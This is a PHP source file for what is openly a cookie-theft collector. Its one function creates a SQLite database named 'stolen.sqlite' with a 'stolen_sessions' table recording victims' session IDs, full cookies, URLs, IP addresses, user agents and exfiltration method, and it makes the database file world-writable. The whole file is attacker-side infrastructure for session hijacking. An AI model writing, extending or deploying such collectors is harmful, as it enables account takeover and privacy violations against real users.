<?php
function attacker_db(): PDO {
    static $pdo = null;
    if ($pdo === null) {
        $path = '/var/www/html/data/stolen.sqlite';
        $needsInit = !file_exists($path);
        $pdo = new PDO("sqlite:$path");
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS stolen_sessions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                sid         TEXT NOT NULL,
                cookie_full TEXT,
                victim_url  TEXT,
                victim_ip   TEXT,
                victim_ua   TEXT,
                exfil_method TEXT,
                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            CREATE INDEX IF NOT EXISTS idx_sid ON stolen_sessions(sid);
            CREATE INDEX IF NOT EXISTS idx_created ON stolen_sessions(created_at);
        ");
        if ($needsInit) {
            chmod($path, 0666);
        }
    }
    return $pdo;
}
